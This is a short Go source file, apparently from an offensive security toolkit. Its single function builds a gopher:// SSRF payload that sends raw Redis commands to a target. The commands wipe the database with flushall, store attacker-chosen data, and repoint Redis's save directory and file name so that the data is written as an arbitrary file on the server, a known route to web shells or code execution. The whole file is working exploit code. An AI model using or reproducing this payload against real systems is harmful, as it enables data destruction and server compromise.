package gopher

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/virzz/logger"
)

func GopherRedisWriteExp(addr, path, name, data string) (string, error) {
	logger.Debug("path: ", path, "name: ", name, "data: ", data)
	ps := []string{
		"*1", "$8", "flushall",
		"*3", "$3", "set", "$3", "xxx", fmt.Sprintf("$%d", len(data)), data,
		"*4", "$6", "config", "$3", "set", "$3", "dir", fmt.Sprintf("$%d", len(path)), path,
		"*4", "$6", "config", "$3", "set", "$10", "dbfilename", fmt.Sprintf("$%d", len(name)), name,
		"*1", "$4", "save",
		"*1", "$4", "quit",
		"",
	}
	p := url.QueryEscape(strings.Join(ps, "\r\n"))
	return fmt.Sprintf("gopher://%s/_%s", addr, replaceRedisPayload(p)), nil
}
